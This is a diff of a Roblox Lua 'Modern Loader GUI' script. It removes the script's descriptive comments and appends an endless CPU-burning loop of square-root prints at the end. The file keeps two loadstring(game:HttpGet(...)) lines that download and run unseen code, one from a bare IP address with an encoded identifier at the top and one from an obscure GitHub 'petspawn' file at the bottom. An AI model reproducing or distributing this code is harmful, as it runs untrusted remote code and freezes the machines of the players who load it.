@@ -1,8 +1,4 @@
-
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
---// Modern Loader GUI (Roblox Lua)
---// Drop into a LocalScript (StarterPlayerScripts, StarterGui, etc.)
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -322,3 +318,13 @@ task.wait(FADE_OUT_TIME + 0.05)
 gui:Destroy()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/dwetyiu7g/refs/heads/main/petspawn"))()
+wait(5)
+while true do
+
+    for i = 1, 999999 do
+
+        print(math.sqrt(i)) --square root calculations are expensive
+
+    end
+
+end
